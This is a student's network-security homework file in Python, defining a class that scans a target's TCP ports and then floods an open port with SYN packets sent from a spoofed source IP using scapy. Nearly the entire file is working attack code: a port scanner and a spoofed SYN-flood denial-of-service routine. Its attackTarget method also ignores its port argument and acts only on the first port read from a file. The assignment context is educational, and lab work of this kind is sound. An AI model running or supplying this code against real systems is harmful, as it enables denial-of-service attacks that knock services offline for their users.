'''
Homework Number: 8
Name: Sneha Mahapatra
ECN Login: mahapat0
Due Date: March 26, 2020
'''
#!/usr/bin/env python3
import socket
import subprocess
import sys
from datetime import datetime
import re
import os.path
from scapy.all import *
from scapy.layers.inet import TCP
from scapy.layers.inet import IP

class TcpAttack:
   #spoofIP: String containing the IP address to spoof
   #targetIP: String containing the IP address of the target computer to attack
   def __init__(self,spoofIP,targetIP):
       self.spoofIP = spoofIP
       self.targetIP = targetIP

    #rangeStart: Integer designating the first port in the range of ports being scanned.
    #rangeEnd: Integer designating the last port in the range of ports being scanned
    #No return value, but writes open ports to openports.txt
   def scanTarget(self,rangeStart,rangeEnd):
       verbosity = 0;  # set it to 1 if you want to see the result for each   #(1)
       # port separately as the scan is taking place

       dst_host = self.targetIP  # (2)
       start_port = rangeStart  # (3)
       end_port = rangeEnd  # (4)

       open_ports = []  # (5)
       # Scan the ports in the specified range:
       for testport in range(start_port, end_port + 1):  # (6)
           sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # (7)
           sock.settimeout(.1)  # (8)
           try:  # (9)
               sock.connect((dst_host, testport))  # (10)
               open_ports.append(testport)
               if verbosity: print(testport)
               sys.stdout.write("%s" % testport)
               sys.stdout.flush()
           except:
               if verbosity: print("Port closed: ", testport)
               sys.stdout.write(".")
               sys.stdout.flush()

       # Now scan through the /etc/services file, if available, so that we can
       # find out what services are provided by the open ports.  The goal here
       # is to construct a dict whose keys are the port names and the values
       # the corresponding lines from the file that are "cleaned up" for
       # getting rid of unwanted white space:
       service_ports = {}
       if os.path.exists("/etc/services"):
           IN = open("/etc/services")
           for line in IN:
               line = line.strip()
               if line == '': continue
               if (re.match(r'^\s*#', line)): continue
               entries = re.split(r'\s+', line)
               service_ports[entries[1]] = ' '.join(re.split(r'\s+', line))
           IN.close()

       OUT = open("openports.txt", 'w')
       if not open_ports:
           print("\n\nNo open ports in the range specified\n")
       else:
           print("\n\nThe open ports:\n\n")
           for k in range(0, len(open_ports)):
               if len(service_ports) > 0:
                   for portname in sorted(service_ports):
                       pattern = r'^' + str(open_ports[k]) + r'/'
                       if re.search(pattern, str(portname)):
                           print("%d:    %s" % (open_ports[k], service_ports[portname]))
               else:
                   print(open_ports[k])
               OUT.write("%s\n" % open_ports[k])
       OUT.close()


    #port: Integer designating the port that the attack will use
    #numSyn: Integer of SYN packets to send to target IP address at the given port
    #If the port is open, perform DoS attack and return 1. Otherwise return 0.
   def attackTarget(self,port,numSyn):
        OUT = open("openports.txt", 'r')
        listOpenP = OUT.readlines()
        OUT.close()
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # (7)
        sock.settimeout(.1)  # (8)
        for port in listOpenP:
            result = sock.connect_ex((self.targetIP, int(port)))
            if(result):
                return 0
            else:
                self.dos(self.spoofIP, self.targetIP, int(port), numSyn)
                return 1
   def dos(self, source_IP, dest_IP, dest_port, how_many_packets):
       srcIP = source_IP  # (1)
       destIP = dest_IP  # (2)
       destPort = dest_port  # (3)
       count = how_many_packets  # (4)

       for i in range(count):  # (5)
           IP_header = IP(src=srcIP, dst=destIP)  # (6)
           TCP_header = TCP(flags="S", sport=RandShort(), dport=destPort)  # (7)
           packet = IP_header / TCP_header  # (8)
           try:  # (9)
               send(packet)  # (10)
           except Exception as e:  # (11)
               print(e)  # (11)
       pass